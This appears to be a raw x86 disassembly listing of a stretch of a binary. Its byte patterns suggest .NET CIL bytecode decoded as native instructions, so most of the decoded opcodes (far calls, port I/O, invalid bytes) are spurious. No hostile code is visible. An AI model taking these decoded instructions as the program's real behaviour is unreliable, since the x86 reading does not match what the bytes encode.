  4034f8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4034fb:	91                   	xchg   %eax,%ecx
  4034fc:	00 00                	add    %al,(%eax)
  4034fe:	0a 5a 1f             	or     0x1f(%edx),%bl
  403501:	2b 58 02             	sub    0x2(%eax),%ebx
  403504:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  40350a:	36 00 00             	add    %al,%ss:(%eax)
  40350d:	0a 13                	or     (%ebx),%dl
  40350f:	0a 12                	or     (%edx),%dl
  403511:	0a 28                	or     (%eax),%ch
  403513:	9a 00 00 0a 30 5d 02 	lcall  $0x25d,$0x300a0000
  40351a:	1f                   	pop    %ds
  40351b:	68 02 7b 2e 00       	push   $0x2e7b02
  403520:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403523:	91                   	xchg   %eax,%ecx
  403524:	00 00                	add    %al,(%eax)
  403526:	0a 5a 1f             	or     0x1f(%edx),%bl
  403529:	2b 58 28             	sub    0x28(%eax),%ebx
  40352c:	5b                   	pop    %ebx
  40352d:	00 00                	add    %al,(%eax)
  40352f:	0a 02                	or     (%edx),%al
  403531:	02 28                	add    (%eax),%ch
  403533:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  403538:	36 00 00             	add    %al,%ss:(%eax)
  40353b:	0a 13                	or     (%ebx),%dl
  40353d:	0b 12                	or     (%edx),%edx
  40353f:	0b 28                	or     (%eax),%ebp
  403541:	37                   	aaa
  403542:	00 00                	add    %al,(%eax)
  403544:	0a 02                	or     (%edx),%al
  403546:	28 59 00             	sub    %bl,0x0(%ecx)
  403549:	00 0a                	add    %cl,(%edx)
  40354b:	59                   	pop    %ecx
  40354c:	18 5b 02             	sbb    %bl,0x2(%ebx)
  40354f:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  403555:	36 00 00             	add    %al,%ss:(%eax)
  403558:	0a 13                	or     (%ebx),%dl
  40355a:	0c 12                	or     $0x12,%al
  40355c:	0c 28                	or     $0x28,%al
  40355e:	9a 00 00 0a 02 28 5a 	lcall  $0x5a28,$0x20a0000
  403565:	00 00                	add    %al,(%eax)
  403567:	0a 59 18             	or     0x18(%ecx),%bl
  40356a:	5b                   	pop    %ebx
  40356b:	73 33                	jae    0x4035a0
  40356d:	00 00                	add    %al,(%eax)
  40356f:	0a 28                	or     (%eax),%ch
  403571:	9b                   	fwait
  403572:	00 00                	add    %al,(%eax)
  403574:	0a 2a                	or     (%edx),%ch
  403576:	02 02                	add    (%edx),%al
  403578:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  40357e:	36 00 00             	add    %al,%ss:(%eax)
  403581:	0a 13                	or     (%ebx),%dl
  403583:	0d 12 0d 28 9a       	or     $0x9a280d12,%eax
  403588:	00 00                	add    %al,(%eax)
  40358a:	0a 28                	or     (%eax),%ch
  40358c:	5b                   	pop    %ebx
  40358d:	00 00                	add    %al,(%eax)
  40358f:	0a 02                	or     (%edx),%al
  403591:	02 28                	add    (%eax),%ch
  403593:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  403598:	36 00 00             	add    %al,%ss:(%eax)
  40359b:	0a 13                	or     (%ebx),%dl
  40359d:	0e                   	push   %cs
  40359e:	12 0e                	adc    (%esi),%cl
  4035a0:	28 37                	sub    %dh,(%edi)
  4035a2:	00 00                	add    %al,(%eax)
  4035a4:	0a 02                	or     (%edx),%al
  4035a6:	28 59 00             	sub    %bl,0x0(%ecx)
  4035a9:	00 0a                	add    %cl,(%edx)
  4035ab:	59                   	pop    %ecx
  4035ac:	18 5b 16             	sbb    %bl,0x16(%ebx)
  4035af:	73 33                	jae    0x4035e4
  4035b1:	00 00                	add    %al,(%eax)
  4035b3:	0a 28                	or     (%eax),%ch
  4035b5:	9b                   	fwait
  4035b6:	00 00                	add    %al,(%eax)
  4035b8:	0a 2a                	or     (%edx),%ch
  4035ba:	06                   	push   %es
  4035bb:	16                   	push   %ss
  4035bc:	3c e1                	cmp    $0xe1,%al
  4035be:	02 00                	add    (%eax),%al
  4035c0:	00 12                	add    %dl,(%edx)
  4035c2:	03 fe                	add    %esi,%edi
  4035c4:	15 0d 00 00 02       	adc    $0x200000d,%eax
  4035c9:	12 03                	adc    (%ebx),%al
  4035cb:	03 6f 94             	add    -0x6c(%edi),%ebp
  4035ce:	00 00                	add    %al,(%eax)
  4035d0:	0a 7d 34             	or     0x34(%ebp),%bh
  4035d3:	00 00                	add    %al,(%eax)
  4035d5:	04 12                	add    $0x12,%al
  4035d7:	03 03                	add    (%ebx),%eax
  4035d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4035da:	9c                   	pushf
  4035db:	00 00                	add    %al,(%eax)
  4035dd:	0a 7d 35             	or     0x35(%ebp),%bh
  4035e0:	00 00                	add    %al,(%eax)
  4035e2:	04 12                	add    $0x12,%al
  4035e4:	03 16                	add    (%esi),%edx
  4035e6:	7d 36                	jge    0x40361e
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	04 15                	add    $0x15,%al
  4035ec:	13 04 15 13 05 12 03 	adc    0x3120513(,%edx,1),%eax
  4035f3:	7b 35                	jnp    0x40362a
  4035f5:	00 00                	add    %al,(%eax)
  4035f7:	04 16                	add    $0x16,%al
  4035f9:	32 3b                	xor    (%ebx),%bh
  4035fb:	16                   	push   %ss
  4035fc:	13 06                	adc    (%esi),%eax
  4035fe:	2b 27                	sub    (%edi),%esp
  403600:	02 7b 2e             	add    0x2e(%ebx),%bh
  403603:	00 00                	add    %al,(%eax)
  403605:	04 11                	add    $0x11,%al
  403607:	06                   	push   %es
  403608:	6f                   	outsl  %ds:(%esi),(%dx)
  403609:	85 00                	test   %eax,(%eax)
  40360b:	00 0a                	add    %cl,(%edx)
  40360d:	7b 34                	jnp    0x403643
  40360f:	00 00                	add    %al,(%eax)
  403611:	04 12                	add    $0x12,%al
  403613:	03 7b 35             	add    0x35(%ebx),%edi
  403616:	00 00                	add    %al,(%eax)
  403618:	04 33                	add    $0x33,%al
  40361a:	06                   	push   %es
  40361b:	11 06                	adc    %eax,(%esi)
  40361d:	13 05 2b 15 11 06    	adc    0x611152b,%eax
  403623:	17                   	pop    %ss
  403624:	58                   	pop    %eax
  403625:	13 06                	adc    (%esi),%eax
  403627:	11 06                	adc    %eax,(%esi)
  403629:	02 7b 2e             	add    0x2e(%ebx),%bh
  40362c:	00 00                	add    %al,(%eax)
  40362e:	04 6f                	add    $0x6f,%al
  403630:	91                   	xchg   %eax,%ecx
  403631:	00 00                	add    %al,(%eax)
  403633:	0a 32                	or     (%edx),%dh
  403635:	ca 11 05             	lret   $0x511
  403638:	16                   	push   %ss
  403639:	3f                   	aas
  40363a:	8f 00                	pop    (%eax)
  40363c:	00 00                	add    %al,(%eax)
  40363e:	12 03                	adc    (%ebx),%al
  403640:	02 7b 2e             	add    0x2e(%ebx),%bh
  403643:	00 00                	add    %al,(%eax)
  403645:	04 11                	add    $0x11,%al
  403647:	05 6f 85 00 00       	add    $0x856f,%eax
  40364c:	0a 7b 36             	or     0x36(%ebx),%bh
  40364f:	00 00                	add    %al,(%eax)
  403651:	04 17                	add    $0x17,%al
  403653:	58                   	pop    %eax
  403654:	7d 36                	jge    0x40368c
  403656:	00 00                	add    %al,(%eax)
  403658:	04 11                	add    $0x11,%al
  40365a:	05 17 58 13 07       	add    $0x7135817,%eax
  40365f:	2b 5d 02             	sub    0x2(%ebp),%ebx
  403662:	7b 2e                	jnp    0x403692
  403664:	00 00                	add    %al,(%eax)
  403666:	04 11                	add    $0x11,%al
  403668:	07                   	pop    %es
  403669:	6f                   	outsl  %ds:(%esi),(%dx)
  40366a:	85 00                	test   %eax,(%eax)
  40366c:	00 0a                	add    %cl,(%edx)
  40366e:	7b 36                	jnp    0x4036a6
  403670:	00 00                	add    %al,(%eax)
  403672:	04 12                	add    $0x12,%al
  403674:	03 7b 36             	add    0x36(%ebx),%edi
  403677:	00 00                	add    %al,(%eax)
  403679:	04 32                	add    $0x32,%al
  40367b:	36 02 7b 2e          	add    %ss:0x2e(%ebx),%bh
  40367f:	00 00                	add    %al,(%eax)
  403681:	04 11                	add    $0x11,%al
  403683:	07                   	pop    %es
  403684:	6f                   	outsl  %ds:(%esi),(%dx)
  403685:	85 00                	test   %eax,(%eax)
  403687:	00 0a                	add    %cl,(%edx)
  403689:	7b 36                	jnp    0x4036c1
  40368b:	00 00                	add    %al,(%eax)
  40368d:	04 12                	add    $0x12,%al
  40368f:	03 7b 36             	add    0x36(%ebx),%edi
  403692:	00 00                	add    %al,(%eax)
  403694:	04 33                	add    $0x33,%al
  403696:	21 02                	and    %eax,(%edx)
  403698:	7b 2e                	jnp    0x4036c8
  40369a:	00 00                	add    %al,(%eax)
  40369c:	04 11                	add    $0x11,%al
  40369e:	07                   	pop    %es
  40369f:	6f                   	outsl  %ds:(%esi),(%dx)
  4036a0:	85 00                	test   %eax,(%eax)
  4036a2:	00 0a                	add    %cl,(%edx)
  4036a4:	7b 35                	jnp    0x4036db
  4036a6:	00 00                	add    %al,(%eax)
  4036a8:	04 12                	add    $0x12,%al
  4036aa:	03 7b 35             	add    0x35(%ebx),%edi
  4036ad:	00 00                	add    %al,(%eax)
  4036af:	04 2e                	add    $0x2e,%al
  4036b1:	06                   	push   %es
  4036b2:	11 07                	adc    %eax,(%edi)
  4036b4:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4036b7:	15 11 07 17 58       	adc    $0x58170711,%eax
  4036bc:	13 07                	adc    (%edi),%eax
  4036be:	11 07                	adc    %eax,(%edi)
  4036c0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4036c3:	00 00                	add    %al,(%eax)
  4036c5:	04 6f                	add    $0x6f,%al
  4036c7:	91                   	xchg   %eax,%ecx
  4036c8:	00 00                	add    %al,(%eax)
  4036ca:	0a 32                	or     (%edx),%dh
  4036cc:	94                   	xchg   %eax,%esp
  4036cd:	11 04 15 33 30 02 12 	adc    %eax,0x12023033(,%edx,1)
  4036d4:	03 02                	add    (%edx),%eax
  4036d6:	7b 2e                	jnp    0x403706
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	04 6f                	add    $0x6f,%al
  4036dc:	91                   	xchg   %eax,%ecx
  4036dd:	00 00                	add    %al,(%eax)
  4036df:	0a 28                	or     (%eax),%ch
  4036e1:	2f                   	das
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	06                   	push   %es
  4036e5:	02 7b 2e             	add    0x2e(%ebx),%bh
  4036e8:	00 00                	add    %al,(%eax)
  4036ea:	04 6f                	add    $0x6f,%al
  4036ec:	91                   	xchg   %eax,%ecx
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	0a 0a                	or     (%edx),%cl
  4036f1:	02 7b 2e             	add    0x2e(%ebx),%bh
  4036f4:	00 00                	add    %al,(%eax)
  4036f6:	04 09                	add    $0x9,%al
  4036f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4036f9:	9d                   	popf
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	0a 38                	or     (%eax),%bh
  4036fe:	d8 00                	fadds  (%eax)
  403700:	00 00                	add    %al,(%eax)
  403702:	02 12                	add    (%edx),%dl
  403704:	03 11                	add    (%ecx),%edx
  403706:	04 28                	add    $0x28,%al
  403708:	2f                   	das
  403709:	00 00                	add    %al,(%eax)
  40370b:	06                   	push   %es
  40370c:	11 04 0a             	adc    %eax,(%edx,%ecx,1)
  40370f:	02 7b 2e             	add    0x2e(%ebx),%bh
  403712:	00 00                	add    %al,(%eax)
  403714:	04 11                	add    $0x11,%al
  403716:	04 09                	add    $0x9,%al
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	9e                   	sahf
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 06                	or     (%esi),%al
  40371e:	17                   	pop    %ss
  40371f:	58                   	pop    %eax
  403720:	13 08                	adc    (%eax),%ecx
  403722:	38 a1 00 00 00 02    	cmp    %ah,0x2000000(%ecx)
  403728:	7b 2e                	jnp    0x403758
  40372a:	00 00                	add    %al,(%eax)
  40372c:	04 11                	add    $0x11,%al
  40372e:	08 6f 85             	or     %ch,-0x7b(%edi)
  403731:	00 00                	add    %al,(%eax)
  403733:	0a 7b 2f             	or     0x2f(%ebx),%bh
  403736:	00 00                	add    %al,(%eax)
  403738:	04 1f                	add    $0x1f,%al
  40373a:	68 11 08 5a 1f       	push   $0x1f5a0811
  40373f:	0a 58 6f             	or     0x6f(%eax),%bl
  403742:	89 00                	mov    %eax,(%eax)
  403744:	00 0a                	add    %cl,(%edx)
  403746:	02 7b 2e             	add    0x2e(%ebx),%bh
  403749:	00 00                	add    %al,(%eax)
  40374b:	04 11                	add    $0x11,%al
  40374d:	08 6f 85             	or     %ch,-0x7b(%edi)
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 7b 30             	or     0x30(%ebx),%bh
  403755:	00 00                	add    %al,(%eax)
  403757:	04 1f                	add    $0x1f,%al
  403759:	68 11 08 5a 1f       	push   $0x1f5a0811
  40375e:	1a 58 6f             	sbb    0x6f(%eax),%bl
  403761:	89 00                	mov    %eax,(%eax)
  403763:	00 0a                	add    %cl,(%edx)
  403765:	02 7b 2e             	add    0x2e(%ebx),%bh
  403768:	00 00                	add    %al,(%eax)
  40376a:	04 11                	add    $0x11,%al
  40376c:	08 6f 85             	or     %ch,-0x7b(%edi)
  40376f:	00 00                	add    %al,(%eax)
  403771:	0a 7b 31             	or     0x31(%ebx),%bh
  403774:	00 00                	add    %al,(%eax)
  403776:	04 1f                	add    $0x1f,%al
  403778:	68 11 08 5a 1f       	push   $0x1f5a0811
  40377d:	2f                   	das
  40377e:	58                   	pop    %eax
  40377f:	6f                   	outsl  %ds:(%esi),(%dx)
  403780:	89 00                	mov    %eax,(%eax)
  403782:	00 0a                	add    %cl,(%edx)
  403784:	02 7b 2e             	add    0x2e(%ebx),%bh
  403787:	00 00                	add    %al,(%eax)
  403789:	04 11                	add    $0x11,%al
  40378b:	08 6f 85             	or     %ch,-0x7b(%edi)
  40378e:	00 00                	add    %al,(%eax)
  403790:	0a 7b 32             	or     0x32(%ebx),%bh
  403793:	00 00                	add    %al,(%eax)
  403795:	04 1f                	add    $0x1f,%al
  403797:	68 11 08 5a 1f       	push   $0x1f5a0811
  40379c:	48                   	dec    %eax
  40379d:	58                   	pop    %eax
  40379e:	6f                   	outsl  %ds:(%esi),(%dx)
  40379f:	89 00                	mov    %eax,(%eax)
  4037a1:	00 0a                	add    %cl,(%edx)
  4037a3:	02 7b 2e             	add    0x2e(%ebx),%bh
  4037a6:	00 00                	add    %al,(%eax)
  4037a8:	04 11                	add    $0x11,%al
  4037aa:	08 6f 85             	or     %ch,-0x7b(%edi)
  4037ad:	00 00                	add    %al,(%eax)
  4037af:	0a 7b 33             	or     0x33(%ebx),%bh
  4037b2:	00 00                	add    %al,(%eax)
  4037b4:	04 1f                	add    $0x1f,%al
  4037b6:	68 11 08 5a 1f       	push   $0x1f5a0811
  4037bb:	58                   	pop    %eax
  4037bc:	58                   	pop    %eax
  4037bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4037be:	89 00                	mov    %eax,(%eax)
  4037c0:	00 0a                	add    %cl,(%edx)
  4037c2:	11 08                	adc    %ecx,(%eax)
  4037c4:	17                   	pop    %ss
  4037c5:	58                   	pop    %eax
  4037c6:	13 08                	adc    (%eax),%ecx
  4037c8:	11 08                	adc    %ecx,(%eax)
  4037ca:	02 7b 2e             	add    0x2e(%ebx),%bh
  4037cd:	00 00                	add    %al,(%eax)
  4037cf:	04 6f                	add    $0x6f,%al
  4037d1:	91                   	xchg   %eax,%ecx
  4037d2:	00 00                	add    %al,(%eax)
  4037d4:	0a 3f                	or     (%edi),%bh
  4037d6:	4d                   	dec    %ebp
  4037d7:	ff                   	(bad)
  4037d8:	ff                   	(bad)
  4037d9:	ff 1f                	lcall  *(%edi)
  4037db:	68 02 7b 2e 00       	push   $0x2e7b02
  4037e0:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4037e3:	91                   	xchg   %eax,%ecx
  4037e4:	00 00                	add    %al,(%eax)
  4037e6:	0a 5a 1f             	or     0x1f(%edx),%bl
  4037e9:	2b 58 02             	sub    0x2(%eax),%ebx
  4037ec:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  4037f2:	36 00 00             	add    %al,%ss:(%eax)
  4037f5:	0a 13                	or     (%ebx),%dl
  4037f7:	0f 12 0f             	movlps (%edi),%xmm1
  4037fa:	28 9a 00 00 0a 30    	sub    %bl,0x300a0000(%edx)
  403800:	5e                   	pop    %esi
  403801:	02 1f                	add    (%edi),%bl
  403803:	68 02 7b 2e 00       	push   $0x2e7b02
  403808:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40380b:	91                   	xchg   %eax,%ecx
  40380c:	00 00                	add    %al,(%eax)
  40380e:	0a 5a 1f             	or     0x1f(%edx),%bl
  403811:	2b 58 28             	sub    0x28(%eax),%ebx
  403814:	5b                   	pop    %ebx
  403815:	00 00                	add    %al,(%eax)
  403817:	0a 02                	or     (%edx),%al
  403819:	02 28                	add    (%eax),%ch
  40381b:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  403820:	36 00 00             	add    %al,%ss:(%eax)
  403823:	0a 13                	or     (%ebx),%dl
  403825:	10 12                	adc    %dl,(%edx)
  403827:	10 28                	adc    %ch,(%eax)
  403829:	37                   	aaa
  40382a:	00 00                	add    %al,(%eax)
  40382c:	0a 02                	or     (%edx),%al
  40382e:	28 59 00             	sub    %bl,0x0(%ecx)
  403831:	00 0a                	add    %cl,(%edx)
  403833:	59                   	pop    %ecx
  403834:	18 5b 02             	sbb    %bl,0x2(%ebx)
  403837:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  40383d:	36 00 00             	add    %al,%ss:(%eax)
  403840:	0a 13                	or     (%ebx),%dl
  403842:	11 12                	adc    %edx,(%edx)
  403844:	11 28                	adc    %ebp,(%eax)
  403846:	9a 00 00 0a 02 28 5a 	lcall  $0x5a28,$0x20a0000
  40384d:	00 00                	add    %al,(%eax)
  40384f:	0a 59 18             	or     0x18(%ecx),%bl
  403852:	5b                   	pop    %ebx
  403853:	73 33                	jae    0x403888
  403855:	00 00                	add    %al,(%eax)
  403857:	0a 28                	or     (%eax),%ch
  403859:	9b                   	fwait
  40385a:	00 00                	add    %al,(%eax)
  40385c:	0a 2b                	or     (%ebx),%ch
  40385e:	43                   	inc    %ebx
  40385f:	02 02                	add    (%edx),%al
  403861:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  403867:	36 00 00             	add    %al,%ss:(%eax)
  40386a:	0a 13                	or     (%ebx),%dl
  40386c:	12 12                	adc    (%edx),%dl
  40386e:	12 28                	adc    (%eax),%ch
  403870:	9a 00 00 0a 28 5b 00 	lcall  $0x5b,$0x280a0000
  403877:	00 0a                	add    %cl,(%edx)
  403879:	02 02                	add    (%edx),%al
  40387b:	28 35 00 00 0a 6f    	sub    %dh,0x6f0a0000
  403881:	36 00 00             	add    %al,%ss:(%eax)
  403884:	0a 13                	or     (%ebx),%dl
  403886:	13 12                	adc    (%edx),%edx
  403888:	13 28                	adc    (%eax),%ebp
  40388a:	37                   	aaa
  40388b:	00 00                	add    %al,(%eax)
  40388d:	0a 02                	or     (%edx),%al
  40388f:	28 59 00             	sub    %bl,0x0(%ecx)
  403892:	00 0a                	add    %cl,(%edx)
  403894:	59                   	pop    %ecx
  403895:	18 5b 16             	sbb    %bl,0x16(%ebx)
  403898:	73 33                	jae    0x4038cd
  40389a:	00 00                	add    %al,(%eax)
  40389c:	0a 28                	or     (%eax),%ch
  40389e:	9b                   	fwait
  40389f:	00 00                	add    %al,(%eax)
  4038a1:	0a 03                	or     (%ebx),%al
  4038a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a4:	9f                   	lahf
  4038a5:	00 00                	add    %al,(%eax)
  4038a7:	0a 28                	or     (%eax),%ch
  4038a9:	0f 00 00             	sldt   (%eax)
  4038ac:	0a 2d 1e 02 7b 2e    	or     0x2e7b021e,%ch
  4038b2:	00 00                	add    %al,(%eax)
  4038b4:	04 06                	add    $0x6,%al
  4038b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b7:	85 00                	test   %eax,(%eax)
  4038b9:	00 0a                	add    %cl,(%edx)
  4038bb:	7b 2f                	jnp    0x4038ec
  4038bd:	00 00                	add    %al,(%eax)
  4038bf:	04 03                	add    $0x3,%al
  4038c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c2:	9f                   	lahf
  4038c3:	00 00                	add    %al,(%eax)
  4038c5:	0a 6f 32             	or     0x32(%edi),%ch
  4038c8:	00 00                	add    %al,(%eax)
  4038ca:	0a 2b                	or     (%ebx),%ch
  4038cc:	1b 02                	sbb    (%edx),%eax
  4038ce:	7b 2e                	jnp    0x4038fe
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	04 06                	add    $0x6,%al
  4038d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038d5:	85 00                	test   %eax,(%eax)
  4038d7:	00 0a                	add    %cl,(%edx)
  4038d9:	7b 2f                	jnp    0x40390a
  4038db:	00 00                	add    %al,(%eax)
  4038dd:	04 72                	add    $0x72,%al
  4038df:	01 00                	add    %eax,(%eax)
  4038e1:	00 70 6f             	add    %dh,0x6f(%eax)
  4038e4:	32 00                	xor    (%eax),%al
  4038e6:	00 0a                	add    %cl,(%edx)
  4038e8:	03 6f a0             	add    -0x60(%edi),%ebp
  4038eb:	00 00                	add    %al,(%eax)
  4038ed:	0a 28                	or     (%eax),%ch
  4038ef:	0f 00 00             	sldt   (%eax)
  4038f2:	0a 2d 1e 02 7b 2e    	or     0x2e7b021e,%ch
  4038f8:	00 00                	add    %al,(%eax)
  4038fa:	04 06                	add    $0x6,%al
  4038fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4038fd:	85 00                	test   %eax,(%eax)
  4038ff:	00 0a                	add    %cl,(%edx)
  403901:	7b 30                	jnp    0x403933
  403903:	00 00                	add    %al,(%eax)
  403905:	04 03                	add    $0x3,%al
  403907:	6f                   	outsl  %ds:(%esi),(%dx)
  403908:	a0 00 00 0a 6f       	mov    0x6f0a0000,%al
  40390d:	32 00                	xor    (%eax),%al
  40390f:	00 0a                	add    %cl,(%edx)
  403911:	2b 1b                	sub    (%ebx),%ebx
  403913:	02 7b 2e             	add    0x2e(%ebx),%bh
  403916:	00 00                	add    %al,(%eax)
  403918:	04 06                	add    $0x6,%al
  40391a:	6f                   	outsl  %ds:(%esi),(%dx)
  40391b:	85 00                	test   %eax,(%eax)
  40391d:	00 0a                	add    %cl,(%edx)
  40391f:	7b 30                	jnp    0x403951
  403921:	00 00                	add    %al,(%eax)
  403923:	04 72                	add    $0x72,%al
  403925:	01 00                	add    %eax,(%eax)
  403927:	00 70 6f             	add    %dh,0x6f(%eax)
  40392a:	32 00                	xor    (%eax),%al
  40392c:	00 0a                	add    %cl,(%edx)
  40392e:	03 6f a1             	add    -0x5f(%edi),%ebp
  403931:	00 00                	add    %al,(%eax)
  403933:	0a 16                	or     (%esi),%dl
  403935:	32 78 03             	xor    0x3(%eax),%bh
  403938:	6f                   	outsl  %ds:(%esi),(%dx)
  403939:	a1 00 00 0a 1f       	mov    0x1f0a0000,%eax
  40393e:	64 30 6e 03          	xor    %ch,%fs:0x3(%esi)
  403942:	6f                   	outsl  %ds:(%esi),(%dx)
  403943:	a1 00 00 0a 1f       	mov    0x1f0a0000,%eax
  403948:	64 2f                	fs das
  40394a:	20 02                	and    %al,(%edx)
  40394c:	7b 2e                	jnp    0x40397c
  40394e:	00 00                	add    %al,(%eax)
  403950:	04 06                	add    $0x6,%al
  403952:	6f                   	outsl  %ds:(%esi),(%dx)
  403953:	85 00                	test   %eax,(%eax)
  403955:	00 0a                	add    %cl,(%edx)
  403957:	7b 31                	jnp    0x40398a
  403959:	00 00                	add    %al,(%eax)
  40395b:	04 03                	add    $0x3,%al
  40395d:	6f                   	outsl  %ds:(%esi),(%dx)
  40395e:	a1 00 00 0a 17       	mov    0x170a0000,%eax
  403963:	58                   	pop    %eax
  403964:	6f                   	outsl  %ds:(%esi),(%dx)
  403965:	86 00                	xchg   %al,(%eax)
  403967:	00 0a                	add    %cl,(%edx)
  403969:	2b 18                	sub    (%eax),%ebx
  40396b:	02 7b 2e             	add    0x2e(%ebx),%bh
  40396e:	00 00                	add    %al,(%eax)
  403970:	04 06                	add    $0x6,%al
  403972:	6f                   	outsl  %ds:(%esi),(%dx)
  403973:	85 00                	test   %eax,(%eax)
  403975:	00 0a                	add    %cl,(%edx)
  403977:	7b 31                	jnp    0x4039aa
  403979:	00 00                	add    %al,(%eax)
  40397b:	04 1f                	add    $0x1f,%al
  40397d:	63 6f 86             	arpl   %ebp,-0x7a(%edi)
  403980:	00 00                	add    %al,(%eax)
  403982:	0a 02                	or     (%edx),%al
  403984:	7b 2e                	jnp    0x4039b4
  403986:	00 00                	add    %al,(%eax)
  403988:	04 06                	add    $0x6,%al
  40398a:	6f                   	outsl  %ds:(%esi),(%dx)
  40398b:	85 00                	test   %eax,(%eax)
  40398d:	00 0a                	add    %cl,(%edx)
  40398f:	7b 31                	jnp    0x4039c2
  403991:	00 00                	add    %al,(%eax)
  403993:	04 17                	add    $0x17,%al
  403995:	6f                   	outsl  %ds:(%esi),(%dx)
  403996:	1d 00 00 0a 02       	sbb    $0x20a0000,%eax
  40399b:	06                   	push   %es
  40399c:	7d 2b                	jge    0x4039c9
  40399e:	00 00                	add    %al,(%eax)
  4039a0:	04 02                	add    $0x2,%al
  4039a2:	03 6f a1             	add    -0x5f(%edi),%ebp
  4039a5:	00 00                	add    %al,(%eax)
  4039a7:	0a 7d 2c             	or     0x2c(%ebp),%bh
  4039aa:	00 00                	add    %al,(%eax)
  4039ac:	04 2b                	add    $0x2b,%al
  4039ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4039af:	03 6f a1             	add    -0x5f(%edi),%ebp
  4039b2:	00 00                	add    %al,(%eax)
  4039b4:	0a 1f                	or     (%edi),%bl
  4039b6:	64 31 3e             	xor    %edi,%fs:(%esi)
  4039b9:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039bc:	00 00                	add    %al,(%eax)
  4039be:	04 06                	add    $0x6,%al
  4039c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c1:	85 00                	test   %eax,(%eax)
  4039c3:	00 0a                	add    %cl,(%edx)
  4039c5:	7b 31                	jnp    0x4039f8
  4039c7:	00 00                	add    %al,(%eax)
  4039c9:	04 16                	add    $0x16,%al
  4039cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4039cc:	86 00                	xchg   %al,(%eax)
  4039ce:	00 0a                	add    %cl,(%edx)
  4039d0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039d3:	00 00                	add    %al,(%eax)
  4039d5:	04 06                	add    $0x6,%al
  4039d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d8:	85 00                	test   %eax,(%eax)
  4039da:	00 0a                	add    %cl,(%edx)
  4039dc:	7b 31                	jnp    0x403a0f
  4039de:	00 00                	add    %al,(%eax)
  4039e0:	04 17                	add    $0x17,%al
  4039e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039e3:	1d 00 00 0a 02       	sbb    $0x20a0000,%eax
  4039e8:	06                   	push   %es
  4039e9:	7d 2b                	jge    0x403a16
  4039eb:	00 00                	add    %al,(%eax)
  4039ed:	04 02                	add    $0x2,%al
  4039ef:	16                   	push   %ss
  4039f0:	7d 2c                	jge    0x403a1e
  4039f2:	00 00                	add    %al,(%eax)
  4039f4:	04 2b                	add    $0x2b,%al
  4039f6:	27                   	daa
  4039f7:	02 7b 2e             	add    0x2e(%ebx),%bh
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	04 06                	add    $0x6,%al
  4039fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ff:	85 00                	test   %eax,(%eax)
  403a01:	00 0a                	add    %cl,(%edx)
  403a03:	7b 31                	jnp    0x403a36
  403a05:	00 00                	add    %al,(%eax)
  403a07:	04 16                	add    $0x16,%al
  403a09:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0a:	1d 00 00 0a 02       	sbb    $0x20a0000,%eax
  403a0f:	7b 2b                	jnp    0x403a3c
  403a11:	00 00                	add    %al,(%eax)
  403a13:	04 06                	add    $0x6,%al
  403a15:	33 07                	xor    (%edi),%eax
  403a17:	02 15 7d 2b 00 00    	add    0x2b7d,%dl
  403a1d:	04 03                	add    $0x3,%al
  403a1f:	6f                   	outsl  %ds:(%esi),(%dx)
  403a20:	a2 00 00 0a 16       	mov    %al,0x160a0000
  403a25:	32 60 12             	xor    0x12(%eax),%ah
  403a28:	09 16                	or     %edx,(%esi)
  403a2a:	16                   	push   %ss
  403a2b:	03 6f a2             	add    -0x5e(%edi),%ebp
  403a2e:	00 00                	add    %al,(%eax)
  403a30:	0a 28                	or     (%eax),%ch
  403a32:	a3 00 00 0a 02       	mov    %eax,0x20a0000
  403a37:	7b 2e                	jnp    0x403a67
  403a39:	00 00                	add    %al,(%eax)
  403a3b:	04 06                	add    $0x6,%al
  403a3d:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3e:	85 00                	test   %eax,(%eax)
  403a40:	00 0a                	add    %cl,(%edx)
  403a42:	7b 32                	jnp    0x403a76
  403a44:	00 00                	add    %al,(%eax)
  403a46:	04 72                	add    $0x72,%al
  403a48:	07                   	pop    %es
  403a49:	01 00                	add    %eax,(%eax)
  403a4b:	70 72                	jo     0x403abf
  403a4d:	29 01                	sub    %eax,(%ecx)
  403a4f:	00 70 12             	add    %dh,0x12(%eax)
  403a52:	09 28                	or     %ebp,(%eax)
  403a54:	a4                   	movsb  %ds:(%esi),%es:(%edi)
